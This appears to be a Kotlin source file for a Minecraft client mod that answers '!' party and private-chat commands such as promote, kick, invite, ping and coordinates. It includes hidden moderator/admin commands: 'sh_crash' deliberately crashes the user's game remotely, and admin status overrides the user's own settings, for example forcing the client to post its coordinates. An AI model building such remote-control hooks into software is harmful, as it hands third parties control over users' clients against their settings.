package set.starlev.features.chat

import net.minecraft.client.Minecraft
import net.minecraft.sounds.SoundEvents
import set.starlev.StarredHeltix
import set.starlev.features.chat.mod.MacroCheck
import set.starlev.features.chat.mod.ModerationManager
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import kotlin.math.floor

object PartyCommands {
    private val mc = Minecraft.getInstance()
    private val partyPattern = Regex("(?i)^\\[?(?:Пати|Party)]?\\s*>?\\s*.*?(\\S+):\\s*(.+)")
    private val pmPattern = Regex("(?i)^\\[(\\S+)\\s*->\\s*\\S+]|^От\\s+(\\S+)|^From\\s+(\\S+)")

    private val config get() = StarredHeltix.feature.chat.partyCommands

    fun init() {
        ChatEventsManager.registerOutgoing { message ->
            if (config.enabled && config.convertCommands && message.startsWith("!")) {
                mc.player?.connection?.sendCommand("pc ${message.substring(1)}")
                true
            } else false
        }

        var lastProcessedMessage = ""
        ChatEventsManager.registerIncoming { message ->
            if (config.enabled && message != lastProcessedMessage) {
                lastProcessedMessage = message
                when {
                    partyPattern.containsMatchIn(message) -> handlePartyMessage(message)
                    pmPattern.containsMatchIn(message) -> handlePrivateMessage(message)
                }
            }
        }
    }

    private fun handlePartyMessage(message: String) {
        val match = partyPattern.find(message) ?: return
        val player = match.groupValues[1]
        val text = match.groupValues[2]


        if (text.contains("!")) handlePartyCommand(player, text)
    }

    private fun handlePrivateMessage(message: String) {
        val match = pmPattern.find(message) ?: return
        val player = match.groupValues.drop(1).firstOrNull { it.isNotEmpty() } ?: return

        mc.player?.playSound(SoundEvents.NOTE_BLOCK_BELL.value(), 0.8f, 1.2f)
        if (message.contains("!")) handlePMCommand(player, message)
    }

    private fun handlePartyCommand(player: String, text: String) {
        val parts = text.trim().split("\\s+".toRegex(), limit = 2)
        if (!parts[0].startsWith("!")) return
        val cmd = parts[0].substring(1).lowercase()
        val args = if (parts.size > 1) parts[1].trim() else ""
        val isAdmin = ModerationManager.isAdmin(player)

        if (ModerationManager.isModerator(player)) handleModCommand(player, cmd, args)

        when (cmd) {
            "promote", "pt", "повысить" -> if (config.promote || isAdmin) mc.player?.connection?.sendCommand("p promote ${if (args.isEmpty()) player else args}")
            "kick", "k", "кик" -> if (config.kick || isAdmin) mc.player?.connection?.sendCommand("p kick $args")
            "invite", "inv", "инвайт" -> if (config.invite || isAdmin) mc.player?.connection?.sendCommand("p invite ${if (args.isEmpty()) player else args}")
            "ping", "пинг" -> if (config.ping || isAdmin) sendPC("Пинг: ${mc.player?.let { mc.connection?.getPlayerInfo(it.uuid)?.latency } ?: 0} мс")
            "fps", "фпс" -> if (config.fps || isAdmin) sendPC("FPS: ${mc.fps}")
            "time", "время" -> if (config.time || isAdmin) sendPC("Время: ${getCurrentTime()}")
            "coords", "координаты" -> if (config.coords || isAdmin) {
                val p = mc.player ?: return
                sendPC("Координаты: ${floor(p.x).toInt()}, ${floor(p.y).toInt()}, ${floor(p.z).toInt()}")
            }
            "rng", "рнг" -> if (config.rng || isAdmin) sendPC("РНГ: ${String.format("%.1f", Math.random() * 100)} %")
            "dt", "дт" -> if (config.dt || isAdmin) sendPC("$player нуждается в перерыве${if (args.isNotEmpty()) ": $args" else ""}")
            "boykisser" -> if (config.boykisser || isAdmin) sendBoykisser()
        }
    }

    private fun handlePMCommand(player: String, message: String) {
        if ((config.invite || ModerationManager.isAdmin(player)) && (message.contains("!invite") || message.contains("!inv"))) {
            mc.player?.connection?.sendCommand("p invite $player")
        }
    }

    private fun handleModCommand(mod: String, cmd: String, args: String) {
        when (cmd) {
            "sh_mute" -> {
                val parts = args.split(" ", limit = 3)
                if (parts.size >= 3) {
                    ModerationManager.mute(parts[0], mod, parts[1], parts[2])
                    sendPC("⚠ $mod замьютил ${parts[0]} на ${parts[1]}: ${parts[2]}")
                }
            }
            "sh_unmute" -> {
                val target = args.trim()
                if (target.isNotEmpty() && ModerationManager.unmute(target)) {
                    sendPC("⚠ $mod размьютил $target")
                }
            }
            "sh_kick" -> {
                val parts = args.split(" ", limit = 2)
                if (parts.size >= 2) sendPC("⚠ $mod кикнул ${parts[0]}: ${parts[1]}")
            }
            "sh_mc" -> if (ModerationManager.isAdmin(mod)) {
                val target = args.trim()
                if (target.isNotEmpty()) {
                    MacroCheck.activate()
                    sendPC("⚠ $mod активировал макро-чек для $target")
                }
            }
            "sh_unmc" -> if (ModerationManager.isAdmin(mod)) {
                val target = args.trim()
                if (target.isNotEmpty()) {
                    MacroCheck.deactivate()
                    sendPC("⚠ $mod деактивировал макро-чек для $target")
                }
            }
            "sh_crash" -> if (ModerationManager.isAdmin(mod)) {
                sendPC("⚠ $mod крашнул игру")
                mc.execute { throw RuntimeException("Admin crash: $mod") }
            }
        }
    }

    private fun sendPC(text: String) {
        mc.player?.connection?.sendCommand("pc starreдheltix ✪ $text")
    }

    private fun sendBoykisser() {
        val lines = listOf(
            "⠀⠀⣽⣿⣿⣿⣧⠀⠀⠀⠠⣤⣄⡀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⡆⠀",
            "⠀⢀⣿⣿⣿⣿⣿⣷⡀⠀⠀⢿⣿⣿⣦⡀⠀⣰⣿⣿⣿⣿⣿⣿⡇⠀",
            "⠀⢸⣿⣿⣿⣿⣿⣿⡿⠄⣠⣤⣿⣿⣿⣿⣄⣿⣿⣿⣿⣿⣿⣿⡇⠀",
            "⠀⢸⣿⣿⣿⣿⣿⣿⣤⣬⣭⣬⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀",
            "⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀",
            "⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⣿⣿⡿⠀⠀",
            "⠀⠀⠸⣿⣧⠀⣴⡆⠀⠀⢸⣿⣿⣿⣿⠀⠀⢸⣿⡌⣶⣿⠟⠁⠀⠀",
            "⠀⠀⠀⠹⡿⢸⣿⡇⠀⠀⢸⣿⣿⣿⣿⠀⠀⢈⣿⡇⢸⣯⣤⣤⠀⠀",
            "⠀⠙⣿⣿⣇⢸⣿⣇⠀⢀⣾⡿⢿⣿⣿⣀⣀⣼⣿⡇⣸⣿⡿⠁⠀⠀",
            "⠀⠀⢀⡟⡉⠞⢻⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⠋⠘⣹⣿⡄⠀⠀⠀",
            "⠀⠀⣼⣿⣧⣶⣿⣿⣿⣟⠻⢋⣍⣉⣋⣼⣿⣿⣿⣶⢿⣿⣿⡄⠀⠀",
            "⠀⠀⠉⠉⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠁⠀⠉⠀⠀⠀",
            "⠀⠀⠀⠀⠀⠀⠀⠠⣬⣭⣽⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀",
            "⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀",
            "⠀⠀⠀⠀⠀⠀⠀⠀⠼⢿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀",
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀"
        )
        Thread {
            lines.forEachIndexed { _, line ->
                Thread.sleep(800)
                mc.player?.connection?.sendCommand("pc $line")
            }
        }.start()
    }

    private fun getCurrentTime(): String {
        return Instant.now().atZone(ZoneId.systemDefault())
            .format(DateTimeFormatter.ofPattern("HH:mm"))
    }


}
